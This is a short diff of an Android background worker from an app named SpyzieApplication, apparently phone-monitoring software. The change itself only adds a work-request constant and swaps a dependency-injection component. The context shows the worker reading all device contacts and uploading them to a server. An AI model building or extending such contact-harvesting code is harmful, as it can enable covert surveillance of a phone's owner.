@@ -29,6 +29,8 @@ import javax.inject.Inject;
  */
 public class GetContactsWorker extends Worker {
 
+    public static final String GET_CONTACTS_WORK_REQUEST = "GET_CONTACTS_WORK_REQUEST";
+
     @Inject
     ApiManager mApiManager;
 
@@ -39,7 +41,7 @@ public class GetContactsWorker extends Worker {
     @NonNull
     @Override
     public Result doWork() {
-        SpyzieApplication.getInstance().getAppComponent().inject(this);
+        SpyzieApplication.getInstance().getServiceComponent().inject(this);
         if (CommonUtils.hasPermissions(getApplicationContext(), new String[]{Manifest.permission.READ_CONTACTS})) {
             mApiManager.sendContactsData(getAllContacts());
         } else {
